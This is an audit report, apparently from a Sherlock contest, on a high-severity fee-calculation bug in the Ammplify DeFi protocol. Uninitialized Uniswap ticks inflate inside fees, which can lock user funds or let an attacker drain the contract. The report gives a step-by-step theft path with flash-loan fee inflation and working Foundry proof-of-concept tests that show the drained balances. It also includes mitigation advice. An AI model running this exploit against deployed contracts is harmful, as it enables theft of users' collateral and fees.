---
tags:
  - lang/solidity
  - sector/dex
  - sector/lending
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
  - vuln/logic/fee-calculation
  - impact/loss-of-funds/locked-funds
  - precondition/uninitialized
  - novelty/variant
  - misassumption/math-is-safe
  - fix/fix-arithmetic
protocol: "[[Ammplify]]"
auditors:
  - "[[panprog]]"
report: "https://github.com/sherlock-audit/2025-09-ammplify-judging"
genome:
  - "[[fee-calculation]]"
  - "[[locked-funds]]"
  - "[[data/uninitialized]]"
  - "[[variant]]"
  - "[[fee-accounting]]"
  - "[[flashloan-callback-auth]]"
  - "[[initializer-auth]]"
  - "[[integer-bounds]]"
---
# H-8: Incorrect inside fees calculation for uninitialized uniswap ticks causes positions funds being stuck in the contract and allows to steal all taker collateral and collected fees

- id: 63174
- impact: HIGH
- protocol: [[Ammplify]]
- reporter: panprog (Sherlock)
- source: N/A

## Summary


This bug report discusses a bug found by a user named panprog in the Ammplify protocol. The bug involves the calculation of inside fees in the `PoolLib.getInsideFees` function, which can result in inflated fees for uninitialized ticks. This can have serious consequences, such as permanently losing user funds or allowing an attacker to steal all protocol funds. The report also includes a proof of concept and suggests a mitigation strategy. The protocol team has already fixed the issue in a recent pull request.

## Details


Source: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/422 

## Found by 
panprog

### Summary

`PoolLib.getInsideFees` calculates inside fees when current price is inside the position range as:
```solidity
        (, , uint256 lowerFeeGrowthOutside0X128, uint256 lowerFeeGrowthOutside1X128, , , , ) = poolContract.ticks(
            lowerTick
        );
        (, , uint256 upperFeeGrowthOutside0X128, uint256 upperFeeGrowthOutside1X128, , , , ) = poolContract.ticks(
            upperTick
        );
...
                uint256 feeGrowthGlobal0X128 = poolContract.feeGrowthGlobal0X128();
                uint256 feeGrowthGlobal1X128 = poolContract.feeGrowthGlobal1X128();
                feeGrowthInside0X128 = feeGrowthGlobal0X128 - lowerFeeGrowthOutside0X128 - upperFeeGrowthOutside0X128;
                feeGrowthInside1X128 = feeGrowthGlobal1X128 - lowerFeeGrowthOutside1X128 - upperFeeGrowthOutside1X128;
```

The issue is that this code doesn't handle uninitialized ticks. `poolContract.ticks` returns correct `lowerFeeGrowthOutside` amounts only for initialized ticks. For uninitialized ticks it returns 0. This means that for uninitialized ticks the `feeGrowthInside` amounts will be equal to `feeGrowthGlobal`.

Examples of impacts caused by this:
- If maker position is created on uninitialized uniswap ticks while the current price is inside the position range, any further actions of this position will revert, with user funds in this position being stuck permanently 
- Attacker can steal all diamon funds by collecting inflated fees

### Root Cause

Uniswap pool's uninitialized `ticks` are not handled correctly, inflating inside fees for uninitialized ticks:
https://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/Pool.sol#L124-L129

### Internal Pre-conditions

1. For funds stuck impact: user creates maker position in a range with 0 uniswap liquidity.
2. For stealing impact: taker taking liquidity in any range

### External Pre-conditions

None.

### Attack Path

**User funds permanently lost**
If maker position is created on uninitialized uniswap ticks while the current price is inside the position range, any further actions of this position will revert:
1. The node's inside fees will be set to `PoolLib.getInsideFees` in liquidity walker. Since position is not yet minted, ticks are uninitialized and node's inside fees will be set to inflated amount (`feeGrowthGlobal`)
2. Later, in the settle walker, the liquidity will be minted and ticks will be initialized to correct values. From this time, `PoolLib.getInsideFees` will return 0 for the same interval
3. Any attempt to adjust this position will revert in liqudity walker (in the `compound` function called from liquidity `up` function):
```solidity
        (uint256 newFeeGrowthInside0X128, uint256 newFeeGrowthInside1X128) = PoolLib.getInsideFees(
            data.poolAddr,
            iter.lowTick,
            iter.highTick
        );
        uint256 feeDiffInside0X128 = newFeeGrowthInside0X128 - node.liq.feeGrowthInside0X128;
        uint256 feeDiffInside1X128 = newFeeGrowthInside1X128 - node.liq.feeGrowthInside1X128;
```
Here the inside fees will be 0 while `node.liq.feeGrowthInside` will be inflated value of `feeGrowthGlobal`. The subtraction will underflow. There will be no way to fix this, thus the position funds will be permanently stuck and unrecoverable to the user.

**Stealing all funds**
When taker liquidity equals maker liquidity at some range, there will be 0 net liquidity (and possible uninitialized tick), while the fees are still claimable on the maker position. This allows to steal all funds in the diamond protocol (taker collateral and collected fees not yet claimed or compounded):
1. Attacker prepares attack by ensuring `feeGrowthGlobal` value is very large (if it is not large already by itself). It's easy to do this by creating any liquidity internval with 1 liquidity, moving price inside the interval, doing flash loan to donate some funds which will increase `feeGrowthGlobal`.
2. Attacker opens multiple maker liquidity positions (non-compounding) waiting for the taker to take any
3. Once the taker takes any of this liquidity (by any amount), attacker moves the current price outside position range and reduces maker liquidity to equal taker liquidity. This reduces uniswap liquidity in the interval to 0 and tick data is reset to 0
4. Attacker moves the current price inside the position range and collects fees (by using `adjustMaker` with the same liquidity due to another issue). Since ticks are uninitialized, fees collection will incorrectly use inflated `getInsideFees` values (equal to large `feeGrowthGlobal`) as if it's the fees collected and since all liquidity belongs to attacker, will send these fees to user. This will send all diamond balance to attacker.

The same attack, but more complex, is possible on the other segments without liquidity, utilizing the liquidity borrowing between nodes.

### Impact

- User funds permanently lost under internal pre-condition 1
- Attacker can steal all protocol funds (takers collateral and collected fees not yet claimed or compounded) with minimal conditions (internal pre-condition 2)

### Proof of concept

1. Funds stuck test. Add this test to `Maker.t.sol`:
```solidity
    function testInflatedInsideFeesRevert() public {
        bytes memory rftData = "";

        // current price inside the range we'll work at
        swapTo(0, TickMath.getSqrtRatioAtTick(840));

        // create maker while current price is inside the price range
        uint256 makerAssetId = makerFacet.newMaker(
            recipient,
            poolAddr,
            720,
            960,
            300e18,
            true,
            minSqrtPriceX96,
            maxSqrtPriceX96,
            rftData
        );

        // try to modify liquidity => it reverts due to incorrect inside fees
        makerFacet.adjustMaker(recipient, makerAssetId, 200e18, minSqrtPriceX96, maxSqrtPriceX96, rftData);
    }
```

2. Funds steal test. Add this test to `Taker.t.sol`:
```solidity
    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        token0.transfer(msg.sender, 9998);
        token1.transfer(msg.sender, 9998);
    }

    function testI4nflatedInsideFeesSteal() public {
        bytes memory rftData = "";

        // Collateralize before creating taker position
        _collateralizeTaker(recipient, liquidity);

        // add tiny liquidity to grow feeGrowthGlobal faster
        addPoolLiq(0, 1200, 1260, 1);
        swapTo(0, TickMath.getSqrtRatioAtTick(1210));

        // donate some amount to make feeGrowthGlobal0X128 and feeGrowthGlobal1X128 larger
        UniswapV3Pool(poolAddr).flash(address(this), 0, 0, "");

        // current price outside the range we'll work at
        swapTo(0, TickMath.getSqrtRatioAtTick(1000));

        // First create a maker large enough to borrow from.
        uint256 makerAssetId = makerFacet.newMaker(
            recipient,
            poolAddr,
            720,
            960,
            300e18,
            false,
            sqrtPriceLimitsX96[0],
            sqrtPriceLimitsX96[1],
            rftData
        );

        ticks[0] = 720;
        ticks[1] = 960;

        // taker takes some of the liquidity (while still outside the range)
        uint256 takerAssetId = takerFacet.newTaker(
            recipient,
            poolAddr,
            ticks,
            100e18,
            vaultIndices,
            sqrtPriceLimitsX96,
            79228162514264337593543950336, // sqrt price at tick 840
            rftData
        );

        // reduce uniswap liquidity at the range to 0 (mLiq = 100e18, tLiq = 100e18)
        // this resets outside liquidity at ticks to 0
        makerFacet.adjustMaker(recipient, makerAssetId, 100e18, sqrtPriceLimitsX96[0], sqrtPriceLimitsX96[1], rftData);

        // move price inside the range
        swapTo(0, TickMath.getSqrtRatioAtTick(840));

        // collect fees (via adjustMaker to overcome collectFees bug)
        // due to inflated inside fees when uniswap liquidity == 0, it is possible
        uint balance0Before = token0.balanceOf(address(this));
        uint balance1Before = token1.balanceOf(address(this));
        makerFacet.adjustMaker(recipient, makerAssetId, 100e18, sqrtPriceLimitsX96[0], sqrtPriceLimitsX96[1], rftData);
        //makerFacet.collectFees(recipient, makerAssetId, sqrtPriceLimitsX96[0], sqrtPriceLimitsX96[1], rftData);

        console.log("fees0 collected: ", token0.balanceOf(address(this)) - balance0Before);
        console.log("fees1 collected: ", token1.balanceOf(address(this)) - balance1Before);
        console.log("diamond balance0: ", token0.balanceOf(diamond));
        console.log("diamond balance1: ", token1.balanceOf(diamond));
    }
```

Console output from running the test:

```solidity
  fees0 collected:  999900005146770924721569
  fees1 collected:  999900018605825853414941
  diamond balance0:  99994853229075278431
  diamond balance1:  99981394174146585059
```

### Mitigation

Handle uninitialized ticks correctly (when either tick is uninitialized, return 0 for inside fees). Be sure to also reset node's inside fees to 0 whenever uniswap's tick is reset. This is quite tricky to do correctly, because:
- there can be non-Ammplify uniswap liquidity, in which case even if ammplify's liquidity is 0, tick might still be initialized
- when there is taker liquidity, there can be multiple maker liquidity positions in the range, each with its own stored inside fees. If the node's inside fees are reset to 0, these position's fees will become incorrect. There are multiple ways to solve this. For example, introduce "base inside fees", where total inside fees = base inside fees + `PoolLib.getInsideFees`. Whenever node's inside fees are reset to 0, base inside fees are incremented by the `PoolLib.getInsideFees` value before the reset.

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/itos-finance/Ammplify/pull/32
